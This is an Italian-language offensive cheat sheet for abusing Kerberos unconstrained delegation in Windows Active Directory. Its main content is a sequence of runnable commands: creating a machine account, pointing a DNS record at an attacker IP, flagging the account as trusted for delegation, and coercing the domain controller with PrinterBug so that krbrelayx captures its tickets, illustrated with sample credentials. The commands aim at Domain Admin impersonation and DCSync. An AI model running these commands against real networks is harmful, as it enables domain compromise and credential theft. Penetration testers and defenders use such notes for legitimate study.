# Delegation Abuse (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `krbrelayx`, `Impacket`, `bloodyAD`, `dnstool`, `NetExec` (nxc) |
| **SO Target** | Windows (Active Directory) |
| **Quando effettuare** | Quando un utente ha privilegi come `SeEnableDelegationPrivilege` o delegazioni attive |
| **Info Utili** | Abuso di Unconstrained, Constrained e Resource-Based Constrained Delegation |

### Funzionamento
Le delegazioni permettono a un servizio di impersonare un utente per accedere a risorse su un altro server. Abusandone, è possibile impersonare account privilegiati (come Domain Admin) e fare DCSYNC.

### Unconstrained Delegation Abuse (krbrelayx)
Richiede che un computer controllato sia "Trusted for Delegation" e che un account privilegiato vi si colleghi.

1. **Aggiunta Computer controllato:**
```bash
addcomputer.py -computer-name <NEW_NAME> -computer-pass <NEW_PW> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```
*Esempio:*
```bash
addcomputer.py -computer-name gianny -computer-pass miao -dc-ip 10.10.10.180 eh.local/nora.gray:Password123
```

2. **DNS Mapping (dnstool):**
```bash
python3 dnstool.py -u '<DOMAIN>\<COMPUTER>$' -p <PW> -action add --record <COMPUTER_FQDN> --data <ATTACKER_IP> --type A -dns-ip <DC_IP> <DOMAIN>
```

3. **Settaggio "Trusted for Delegation" (bloodyAD):**
```bash
python3 bloodyAD.py --host '<DC_IP>' -d '<DOMAIN>' -u <USER> -p <PW> add uac '<COMPUTER>$' -f TRUSTED_FOR_DELEGATION
```

4. **Coercion (Costringere DC ad autenticarsi):**
In un terminale: `python3 krbrelayx.py -hashes :<HASH>`
In un altro terminale:
```bash
nxc smb <DC_IP> -u '<COMPUTER>$' -p '<PW>' -M coerce_plus -o LISTENER=<COMPUTER_FQDN> METHOD=PrinterBug
```

### URL Fondamentali
- [Dirk-jan Mollema - Unconstrained Delegation Abuse Toolkit](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
- [The Hacker Recipes - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
- [Hacktricks Delegation Abuse](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-delegation-abuse.html)
